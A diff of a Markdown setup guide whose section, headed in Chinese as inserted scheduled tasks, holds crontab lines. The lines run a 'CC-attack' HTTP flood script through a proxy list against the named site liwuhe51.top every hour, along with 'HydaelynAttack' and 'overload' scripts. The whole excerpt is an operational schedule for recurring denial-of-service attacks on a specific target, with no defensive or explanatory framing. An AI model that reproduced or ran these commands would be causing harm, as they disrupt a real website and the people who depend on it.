@@ -82,7 +82,7 @@ crontab -e
 
 ## 插入的计划任务
 ```shell
-0 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/socks4.txt -v 4 -s 30
+0 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/proxy.txt -v 5 -s 30
 15 * * * * python3 ~/HydaelynAttack/HydaelynAttack_p.py
 30 * * * * python3 ~/overload/overload_p.py
 ```
